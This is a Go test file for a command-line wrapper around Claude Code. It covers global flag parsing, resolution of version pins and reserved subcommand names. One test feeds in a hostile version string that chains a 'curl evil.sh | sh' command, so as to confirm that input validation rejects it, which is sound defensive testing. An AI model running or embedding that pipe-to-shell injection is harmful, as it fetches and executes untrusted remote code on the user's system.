package cli

// Internal test: parseGlobals is the subtlest part of the CLI surface and has
// no exported entry point that does not also touch the filesystem.

import (
	"errors"
	"testing"

	"github.com/stretchr/testify/require"
)

func TestParseGlobals(t *testing.T) {
	t.Run("bare invocation", func(t *testing.T) {
		g, rest, forced := parseGlobals(nil)
		require.Empty(t, g.profile)
		require.Empty(t, rest)
		require.False(t, forced)
	})

	t.Run("profile flag, separate value", func(t *testing.T) {
		g, rest, forced := parseGlobals([]string{"--profile", "work", "--resume"})
		require.Equal(t, "work", g.profile)
		require.Equal(t, []string{"--resume"}, rest)
		require.False(t, forced)
	})

	t.Run("profile flag, equals form", func(t *testing.T) {
		g, rest, _ := parseGlobals([]string{"--profile=work", "--resume"})
		require.Equal(t, "work", g.profile)
		require.Equal(t, []string{"--resume"}, rest)
	})

	t.Run("short profile flag", func(t *testing.T) {
		g, _, _ := parseGlobals([]string{"-p", "work"})
		require.Equal(t, "work", g.profile)
	})

	t.Run("runtime flag", func(t *testing.T) {
		g, _, _ := parseGlobals([]string{"--runtime=docker"})
		require.Equal(t, "docker", g.runtime)

		g, _, _ = parseGlobals([]string{"--runtime", "podman"})
		require.Equal(t, "podman", g.runtime)
	})

	t.Run("stops at first non-global", func(t *testing.T) {
		g, rest, forced := parseGlobals([]string{"doctor"})
		require.Empty(t, g.profile)
		require.Equal(t, []string{"doctor"}, rest)
		require.False(t, forced, "reserved word must still dispatch")
	})

	t.Run("double dash forces passthrough", func(t *testing.T) {
		_, rest, forced := parseGlobals([]string{"--", "doctor"})
		require.Equal(t, []string{"doctor"}, rest)
		require.True(t, forced, "`ccc -- doctor` must reach claude, not ccc")
	})

	t.Run("globals before double dash still parse", func(t *testing.T) {
		g, rest, forced := parseGlobals([]string{"--profile", "work", "--", "--resume"})
		require.Equal(t, "work", g.profile)
		require.Equal(t, []string{"--resume"}, rest)
		require.True(t, forced)
	})

	t.Run("claude flags pass through untouched", func(t *testing.T) {
		_, rest, forced := parseGlobals([]string{"--dangerously-skip-permissions"})
		require.Equal(t, []string{"--dangerously-skip-permissions"}, rest)
		require.False(t, forced)
	})

	t.Run("--help is ccc's help", func(t *testing.T) {
		g, _, forced := parseGlobals([]string{"--help"})
		require.True(t, g.help)
		require.False(t, forced)
	})

	t.Run("-h is ccc's help", func(t *testing.T) {
		g, _, _ := parseGlobals([]string{"-h"})
		require.True(t, g.help)
	})

	t.Run("double dash reaches claude's help, not ccc's", func(t *testing.T) {
		g, rest, forced := parseGlobals([]string{"--", "--help"})
		require.False(t, g.help, "`ccc -- --help` must not print ccc's help")
		require.Equal(t, []string{"--help"}, rest)
		require.True(t, forced)
	})

	t.Run("help flag after globals", func(t *testing.T) {
		g, _, _ := parseGlobals([]string{"--profile", "work", "--help"})
		require.True(t, g.help)
		require.Equal(t, "work", g.profile)
	})

	t.Run("dangling flag value does not panic", func(t *testing.T) {
		g, rest, _ := parseGlobals([]string{"--profile"})
		require.Empty(t, g.profile)
		require.Equal(t, []string{"--profile"}, rest)
	})
}

func TestResolveTarget(t *testing.T) {
	latest := func(v string) func() (string, error) {
		return func() (string, error) { return v, nil }
	}
	never := func() (string, error) {
		t.Helper()
		t.Fatal("must not query the registry")
		return "", nil
	}

	t.Run("empty --to resolves latest", func(t *testing.T) {
		got, err := resolveTarget("", latest("2.1.205"))
		require.NoError(t, err)
		require.Equal(t, "2.1.205", got)
	})

	t.Run("explicit latest resolves to a concrete version", func(t *testing.T) {
		// Storing "latest" would hash to a stable image tag and freeze the
		// image forever. It must never be written to a pin.
		got, err := resolveTarget("latest", latest("2.1.205"))
		require.NoError(t, err)
		require.Equal(t, "2.1.205", got)
		require.NotEqual(t, "latest", got)
	})

	t.Run("concrete version does not touch the registry", func(t *testing.T) {
		got, err := resolveTarget("2.1.204", never)
		require.NoError(t, err)
		require.Equal(t, "2.1.204", got)
	})

	t.Run("registry returning latest is an error, not a pin", func(t *testing.T) {
		_, err := resolveTarget("", latest("latest"))
		require.ErrorContains(t, err, "not a concrete version")
	})

	t.Run("registry failure propagates", func(t *testing.T) {
		_, err := resolveTarget("", func() (string, error) {
			return "", errors.New("network down")
		})
		require.ErrorContains(t, err, "network down")
	})

	t.Run("hostile --to is rejected before it reaches a build arg", func(t *testing.T) {
		_, err := resolveTarget("2.1.205 && curl evil.sh | sh", never)
		require.ErrorContains(t, err, "invalid claude version")
	})
}

func TestReservedWordsAreDispatchable(t *testing.T) {
	for _, name := range []string{"profile", "pin", "check", "help", "version"} {
		require.Contains(t, reserved, name)
	}

	// Every reserved word is a claude argument that then needs `--` to pass
	// through, so a collision with a Claude Code subcommand taxes the common
	// case. This is the list as of 2.1.205; none of it may be reserved.
	claudeSubcommands := []string{
		"agents", "auth", "auto-mode", "doctor", "gateway", "install", "mcp",
		"plugin", "plugins", "project", "setup-token", "ultrareview", "update",
		"upgrade",
	}
	for _, name := range claudeSubcommands {
		require.NotContains(t, reserved, name, "%q is a claude subcommand", name)
	}

	// Folded away rather than renamed: `build` into `pin --no-cache`, `login`
	// into `claude auth login`.
	require.NotContains(t, reserved, "build")
	require.NotContains(t, reserved, "login")
}
